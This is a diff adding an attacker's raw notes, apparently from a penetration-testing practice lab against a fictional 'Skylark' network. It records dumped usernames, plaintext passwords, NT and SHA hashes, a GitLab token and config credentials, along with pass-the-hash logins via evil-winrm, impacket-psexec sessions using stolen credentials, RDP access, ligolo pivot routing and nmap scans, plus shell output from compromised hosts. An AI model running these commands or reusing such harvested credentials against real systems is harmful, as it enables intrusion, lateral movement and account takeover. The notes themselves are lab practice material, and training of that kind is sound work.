@@ -1,0 +1,467 @@
+PASS: 
+----------------------------------------------------------------------------
+		USERS/PASSWORD: 
+root
+www-data
+milan
+letsfly
+flybike
+airborne
+sarah
+skia
+uploader
+postgres
+Administrator
+backup_service
+baop__user
+d.johnson
+f.miller
+Guest
+helpdesk_setup
+j.jameson
+j.jones
+k.kelley
+k.smith
+kiosk
+krbtgt
+l.nguyen
+n.engels
+print_service
+s.ahmed
+
+		PASS:
+Christopher
+7NVLVTDGJ38HM2TQ
+fr0xl0r.TravisCI
+EAZT5EMULA75F8MC
+XEwUS^9R2Gwt8O914
+
+
+		HASHES: 
+
+
+----------------------------------------------------------------------------
+		223:
+milan
+Skylark:$5$wpqNdybSegkaxdZq$iCXcCM54l4Qig25b5RT5wvEPhbJ/7pioFsFsbSZ0JyC 
+letsfly/airborne:$5$NBzpteuosadgzxAw$NM1Jqt7N4j8TtUYyBff1S03Nbc2IQCeqOGsFgwqQQS2 
+flybike/sarah:Christopher
+root:7NVLVTDGJ38HM2TQ
+root:fr0xl0r.TravisCI
+----------------------------------------------------------------------------
+		225:
+www-data
+root
+uploader
+postgres:EAZT5EMULA75F8MC
+SKYLARK\kiosk:XEwUS^9R2Gwt8O914
+
+
+user-guide-rdweb.pdf
+Producer                        : Skia/PDF m108
+Creator                         : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+
+----------------------------------------------------------------------------
+		221: 
+Administrator
+kiosk:XEwUS^9R2Gwt8O914
+backup_service:It4Server
+helpdesk_setup
+
+
+[+] Shahash found !!!
+Shahash: 04195d1c3352068a81238142ec54b80bfcbe69a2
+Nthash: 92dd9eace3cf9ea33a95953aef6845ba
+Login: kiosk
+
+[+] Shahash found !!!
+Shahash: 945c9f3d740a00639bbfbd6864b35f7cb135b299
+Nthash: c31fae09682e09c143d4bc2e7f93826d
+Login: AUSTIN02$
+
+[+] Shahash found !!!
+Shahash: b6c2ba5282b13d5849f8953cac8d18df81763665
+Nthash: 17add237f30abaecc9d884f72958b928
+Login: Administrator
+
+User: Administrator.SKYLARK
+Chromium edge passwords 
+[+] Password found !!!
+URL: 
+Login: 
+Password: b'v10\xef\xbc\x80I\xa8\xd1\xfc\xb1J\xcd \xc1\xa9.q]\xb1\x15~\xf2\xa6\xdf\x05$\xc1\xe7\xd1\xb2'
+[+] Password found !!!
+URL: 
+Login: 
+Password: b'v10&\xea\xdab_\xbe\xbc\xd8\x8b\x9bK\x0b+\xc6\xb7FI\xef^:\x8a`\x1e\x13\x0c1\xb2\x15'
+
+
+Administrator            
+backup_service           
+baop__user               
+d.johnson                
+f.miller                 
+Guest                    
+helpdesk_setup           
+j.jameson                
+j.jones                  
+k.kelley                 
+k.smith                  
+kiosk                    
+krbtgt                   
+l.nguyen                 
+n.engels                 
+print_service            
+s.ahmed   
+
+----------------------------------------------------------------------------
+				11
+backup_service:It4Server
+
+Shahash: 9589af1c48753335126e4be90447c1f3ae2d873f
+Nthash: c4468acfbf7d29c74c590b01282f88d3
+Login: Administrator
+
+[+] Shahash found !!!
+Shahash: cc1ed1ff5033856e82274fae536f9042932a23d0
+Nthash: 00c0a9232ef1a0a43d78f2f946a531ce
+Login: LAB$
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c4468acfbf7d29c74c590b01282f88d3:::
+
+----------------------------------------------------------------------------
+
+.223 - local + proof	✅
+.225 - local + proof	✅
+.221 - local + proof	✅
+.11 - proof		✅
+.13 - proof		✅
+.220  - local + proof	✅
+.250  - local + proof	✅
+.226 - local + proof	✅
+.222 - local		✅
+.227 - proof		✅
+
+---------------------------------------------------------------------------------------------
+			.223 - local + proof	✅
+milan
+Skylark:$5$wpqNdybSegkaxdZq$iCXcCM54l4Qig25b5RT5wvEPhbJ/7pioFsFsbSZ0JyC 
+letsfly/airborne:$5$NBzpteuosadgzxAw$NM1Jqt7N4j8TtUYyBff1S03Nbc2IQCeqOGsFgwqQQS2 
+flybike/sarah:Christopher
+root:7NVLVTDGJ38HM2TQ
+root:fr0xl0r.TravisCI
+
+---------------------------------------------------------------------------------------------
+			.225 - local + proof	✅
+root:x:0:0:root:/root:/bin/bash
+uploader:x:1000:1000:singapore06,,,:/home/uploader:/bin/bash
+postgres:x:128:134:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+
+---------------------------------------------------------------------------------------------
+			.221 - local + proof ✅
+evil-winrm -i 192.168.208.221 -u Administrator -H 17add237f30abaecc9d884f72958b928
+    Directory: C:\Users
+d-----        11/16/2022   4:30 AM                .NET v4.5
+d-----        11/16/2022   4:30 AM                .NET v4.5 Classic
+d-----          1/5/2023   2:46 AM                Administrator
+d-----          3/1/2023   1:40 AM                Administrator.SKYLARK
+d-----        11/23/2022   7:11 AM                backup_service
+d-----        11/24/2022   6:56 AM                helpdesk_setup
+d-----          1/5/2023   3:01 AM                kiosk
+d-r---        11/14/2022   9:22 AM                Public
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.208.221
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.208.254
+Ethernet adapter Ethernet1:
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 10.10.168.254
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> arp -A
+Interface: 192.168.208.221 --- 0x3
+  Internet Address      Physical Address      Type
+  192.168.50.254        00-50-56-ab-a4-bb     dynamic
+  192.168.208.254       00-50-56-ab-a4-bb     dynamic
+  192.168.208.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+Interface: 10.10.168.254 --- 0x5
+  Internet Address      Physical Address      Type
+  10.10.168.11          00-50-56-ab-8d-18     dynamic
+  10.10.168.12          00-50-56-ab-ea-15     dynamic
+  10.10.168.13          00-50-56-ab-e1-21     dynamic
+  10.10.168.240         00-50-56-ab-5e-23     dynamic
+  10.10.168.250         00-50-56-ab-f7-1b     dynamic
+  10.10.168.255         ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+
+---------------------------------------------------------------------------------------------
+			.11 - proof ✅
+impacket-psexec backup_service:It4Server@10.10.168.11 cmd.exe
+ Directory of C:\Users
+11/21/2022  07:51 AM    <DIR>          .
+11/16/2022  02:21 AM    <DIR>          Administrator
+11/21/2022  07:51 AM    <DIR>          administrator.SKYLARK
+11/16/2022  02:21 AM    <DIR>          Public
+
+C:\Windows\system32> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.168.11
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.168.254
+
+C:\Windows\system32> arp -A
+Interface: 10.10.168.11 --- 0x6
+  Internet Address      Physical Address      Type
+  10.10.168.250         00-50-56-ab-f7-1b     dynamic   
+  10.10.168.254         00-50-56-ab-b4-35     dynamic   
+  10.10.168.255         ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static  
+
+---------------------------------------------------------------------------------------------
+		.13 - proof ✅ 10.20 IP RANGE 
+impacket-psexec backup_service:It4Server@10.10.168.13 cmd.exe
+ Directory of C:\Users
+11/22/2022  04:22 AM    <DIR>          .
+01/10/2023  04:18 AM    <DIR>          Administrator
+03/01/2023  02:35 AM    <DIR>          Administrator.SKYLARK
+11/16/2022  03:22 AM    <DIR>          Public
+
+C:\Windows\system32> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.168.13
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.168.254
+Ethernet adapter Ethernet1:
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.20.168.254
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+
+C:\Windows\system32> arp -A
+0-fc     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static    
+
+---------------------------------------------------------------------------------------------
+		.220  - local + proof	✅
+impacket-psexec backup_service:It4Server@10.10.168.240 cmd.exe
+ Directory of C:\Users
+11/18/2022  04:19 AM    <DIR>          .
+11/18/2022  04:19 AM    <DIR>          ..
+03/01/2023  03:04 AM    <DIR>          Administrator
+11/18/2022  04:19 AM    <DIR>          Administrator.SKYLARK
+11/14/2022  07:26 AM    <DIR>          Public
+
+C:\Windows\system32> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet1:
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.168.240
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.208.220
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.208.254
+
+C:\Windows\system32> arp -A
+Interface: 10.10.168.240 --- 0x7
+  Internet Address      Physical Address      Type
+  10.10.168.250         00-50-56-ab-f7-1b     dynamic   
+  10.10.168.254         00-50-56-ab-b4-35     dynamic   
+  10.10.168.255         ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+Interface: 192.168.208.220 --- 0xf
+  Internet Address      Physical Address      Type
+  192.168.50.254        00-50-56-ab-a4-bb     dynamic   
+  192.168.208.254       00-50-56-ab-a4-bb     dynamic   
+  192.168.208.255       ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+
+---------------------------------------------------------------------------------------------
+			.250  - local + proof	✅
+impacket-psexec backup_service:It4Server@10.10.168.250 cmd.exe
+ Directory of C:\Users
+05/17/2024  10:46 PM    <DIR>          .
+12/14/2022  04:39 PM    <DIR>          Administrator
+05/17/2024  10:46 PM    <DIR>          backup_service
+01/18/2023  03:37 AM    <DIR>          helpdesk_setup
+11/16/2022  02:46 AM    <DIR>          Public
+
+Local Admin Passwords:
+- PARIS: MusingExtraCounty98
+- SYDNEY: DowntownAbbey1923
+
+         * Username : Administrator
+         * Domain   : SKYLARK.com
+         * Password : E2koUInnHx5_nrAjBouE
+
+C:\Windows\system32> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.168.250
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.168.254
+
+C:\Windows\system32> arp -A
+Interface: 10.10.168.250 --- 0xf
+  Internet Address      Physical Address      Type
+  10.10.168.10          00-50-56-ab-a8-7e     dynamic   
+  10.10.168.11          00-50-56-ab-8d-18     dynamic   
+  10.10.168.12          00-50-56-ab-ea-15     dynamic   
+  10.10.168.13          00-50-56-ab-e1-21     dynamic   
+  10.10.168.240         00-50-56-ab-5e-23     dynamic   
+  10.10.168.254         00-50-56-ab-b4-35     dynamic   
+  10.10.168.255         ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static   
+
+---------------------------------------------------------------------------------------------
+			.226 - local + proof✅
+evil-winrm -i 192.168.208.226 -u Administrator -H 90ebcd7b7e2b6be22a05ceb0bf486944
+
+j.local:5iQ78OU2JHAAKbQc5XAr
+Hitoshi:xsYu9XPYNu9dBfHo8L4k
+Hitoshi@skylark.com:ganbatteyo!123
+ext_acc:DoNotShare!SkyLarkLegacyInternal2008
+User Name:Password
+Michael321:12345
+ann.sales:B9aL9lbDOlNkGmJxusmi
+P@ssword!
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.208.226
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.208.254
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> arp -A
+Interface: 192.168.208.226 --- 0xb
+  Internet Address      Physical Address      Type
+  192.168.50.254        00-50-56-ab-a4-bb     dynamic
+  192.168.208.254       00-50-56-ab-a4-bb     dynamic
+  192.168.208.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+
+---------------------------------------------------------------------------------------------
+			.222 - local✅
+FTP credentials for umbraco web application upgrade:
+ftp_jp
+~be<3@6fe1Z:2e8
+
+stun_server_username= l.nguyen
+passwd= ChangeMePlease__XMPPTest
+reg_identity=sip: l.nguyen@skylark.com
+reg_proxy=<sip:172.16.50.32;transport=tls>
+
+stun_server_username= j.jones
+passwd= ChangeMePlease__XMPPTest
+reg_identity=sip: j.jones@skylark.com
+reg_proxy=<sip:172.16.50.32;transport=tls>
+
+stun_server_username=j.jameson
+passwd= ChangeMePlease__XMPPTest
+reg_identity=sip: j.jameson@skylark.com
+reg_proxy=<sip:172.16.50.32;transport=tls>
+
+---------------------------------------------------------------------------------------------
+			.227 - proof✅
+xfreerdp /u:Administrator /p:DowntownAbbey1923 /v:192.168.208.227 /size:80% /drive:kali,.
+
+PS C:\Users\Administrator> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.208.227
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.208.254
+
+PS C:\Users\Administrator> arp -A
+Interface: 192.168.208.227 --- 0x9
+  Internet Address      Physical Address      Type
+  192.168.50.254        00-50-56-ab-a4-bb     dynamic
+  192.168.208.254       00-50-56-ab-a4-bb     dynamic
+  192.168.208.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+
+---------------------------------------------------------------------------------------------
+		.110 - local + proof 	- 10.20.168.110 ✅
+ssh development@10.10.143.10
+development:Build258IQ
+
+Username: research
+Password: 1G8prY^0@8FHy&2749cg
+
+# Utils.ipynb 
+"    private_token='glpat-PzrxBe-5Js7c3t7hoq4X'\n",
+       "  'author_name': 'Research',\n",
+       "  'author_email': 'research@skylark.com',\n",
+       "  'authored_date': '2022-11-28T07:31:43.000-05:00',\n",
+       "  'committer_name': 'Research',\n",
+       "  'committer_email': 'research@skylark.com',\n",
+"  'web_url': 'http://cicd.skylark.com/skylark-rd/scratchpad/-/commit/94d8b9e8f678ad2f52263fefb3a32cf533986a19'},\n",
+"  'sha': '94d8b9e8f678ad2f52263fefb3a32cf533986a19',\n",
+
+    "UserUsername": "skylark",
+    "UserPassword": "User+dcGvfwTbjV[]",
+    "AdminUsername": "skylark_admin",
+    "AdminPassword": "Admin!_xDHj88vAnS!__",
+    "PartnerUsername": "partner",
+    "PartnerPassword": "Skylark__ChangingTheWorld!"
+  },
+  "UploadsDirectory": "C:\\Uploads\\",
+  "MicrosoftMetadataRemovalScript": "C:\\Uploads\\734cc188test.ps1"
+
+
+---------------------------------------------------------------------------------------------
+		.14 - local  + proof 	- 10.20.168.14
+
+LIGOLO: .13 .10 = ACCESS to 10.20.143.0/24
+sudo ip route add 10.20.143.0/24 dev ligolo
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.20.143.14
+
+
+---------------------------------------------------------------------------------------------
+
+.15 - local + proof 	- 10.20.168.15
+.110 - local + proof 	- 10.20.168.110
+.111 - local + proof 	- 10.20.168.111
+
+.12 - local + proof 	- 10.10.168.12 - ssh, http, 
+
+.31 - local + proof	- 172.16.208.31
+.32 - proof		- 172.16.208.32
+.30 - local + proof	- 172.16.208.30
+
+.224 - local +  proof	- 192.168.208.224
+
+
+---------------------------------------------------------------------------------------------
+
